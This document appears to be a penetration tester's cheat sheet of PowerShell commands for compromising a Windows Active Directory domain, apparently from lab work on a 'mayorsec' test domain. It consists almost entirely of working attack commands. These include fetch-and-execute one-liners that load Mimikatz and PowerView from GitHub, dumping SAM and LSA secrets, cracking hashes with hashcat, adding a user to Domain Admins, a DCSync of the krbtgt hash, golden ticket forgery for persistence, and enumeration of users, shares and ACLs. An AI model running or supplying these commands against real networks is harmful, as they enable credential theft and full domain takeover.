
## Load mimikatz into memory 
### iex (New-Object Net.WebClient).DownloadString('https://github.com/dievus/PowerShellForPentesters/blob/main/Tools/Invoke-Mimikatz.ps1')
- invoke-mimikatz -command token::elevate
- invoke-mimikatz -command lsadump::sam 
- invoke-mimikatz -command lsadump::secrets
### hashcat to crack 
- hashcat.exe -a 0 -m 1000 <hash> wordlist.txt -O 
### Domain Admin remote
- runas /user:j.taylor "powershell.exe"
- net group "domain admins" j.taylor /add /domain 
- $password = ConvertTo-SecureString <password> -AsPlainText -Force
- $cred = new-object system.management.automation.pscredential ("mayorsec\j.taylor", $password)
- enter-pssession -computername dc01 -credential $cred 
### Golden Ticket Persistence
- iex (New-Object Net.WebClient).DownloadString('https://github.com/dievus/PowerShellForPentesters/blob/main/Tools/Invoke-Mimikatz.ps1')
- invoke-mimikatz -command '"lsadump::dcsync /domain:<domain> /user:krbtgt"'
- iex (New-Object Net.WebClient).DownloadString('https://github.com/dievus/PowerShellForPentesters/blob/main/Tools/PowerView.ps1')
- get-domainSID -domain mayorsec.local 
- invoke-mimikatz -command '"kerberos::golden /user:administrator /domain:<domain> /sid:<domainsid> /krbtgt:<hash> /ptt"'
- invoke-mimikatz -command '"kerberos::golden /user:administrator /domain:<domain> /sid:<domainsid> /krbtgt:<hash>"'
- klist
### do anything on dc just run the command for ticket
- ls \\dc01\\C$ 


## Load powerview into memory 
iex (New-Object Net.WebClient).DownloadString('https://github.com/dievus/PowerShellForPentesters/blob/main/Tools/PowerView.ps1')
### Users and Groups
- get-netuser
- get-netuser | select cn
- get-netuser | select -expandproperty samaccountname
- find-userfield -searchfield description
- find-userfield -searchfield description "admin"
- find-userfield -searchfield description "built"
- get-netgroup
- get-netgroup -username "s.chisholm"
- net users s.chrisholm /domain
- get-netgroup -groupname "admins" -fulldata
- get-netgroup -groupname "domain admins" -fulldata
- invoke-enumeratelocaladmin
### Computers and Shares in Domain
- get-netcomputer -fulldata
- get-netcomputer -operatingsystem "*Windows 10*"
- get-netcomputer -operatingsystem "*Windows Server*"
- invoke-sharefinder
- ls \\DC01\Shared
### GPO
- get-netgpo
- get-netgroup -groupname engineering
- get-objectacl -samaccountname "engineering" -resolveguids